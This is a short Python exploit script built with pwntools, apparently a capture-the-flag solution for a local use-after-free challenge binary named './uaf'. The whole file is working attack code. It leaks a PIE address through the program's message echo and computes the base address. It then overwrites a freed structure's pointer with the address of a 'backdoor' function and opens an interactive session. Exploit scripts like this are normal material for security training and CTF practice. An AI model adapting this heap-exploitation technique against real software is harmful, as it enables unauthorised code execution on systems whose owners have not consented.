#!/usr/bin/env python
from pwn import *

r = process( './uaf' )

# r.sendlineafter( 'Size of your message:', str(0x10) )
# r.sendlineafter( 'Message:', 'A'*8 )

# pause()
r.sendlineafter( 'Size of your message:', str(0x10) )
r.sendlineafter( 'Message:', 'a'*8 )
r.recvuntil( 'Saved message:' )
r.recvuntil( 'aaaaaaaa' )
leak_pie = u64( r.recv(6) + "\x00\x00" )
log.success( 'leak pie: ' + hex(leak_pie) )
pie_base = leak_pie - 0xa0a
log.success( 'PIE Base = ' + hex(pie_base) )
backdoor = pie_base + 0x0000000000000ab5

r.sendlineafter( 'Size of your message:', str(0x10) )
r.sendlineafter( 'Message:', 'A'*8 + 'B'*7 )
pause()
r.sendlineafter( 'Size of your message:', str(0x10) )
r.sendlineafter( 'Message:', 'A'*8 + p64(backdoor) )

r.interactive()
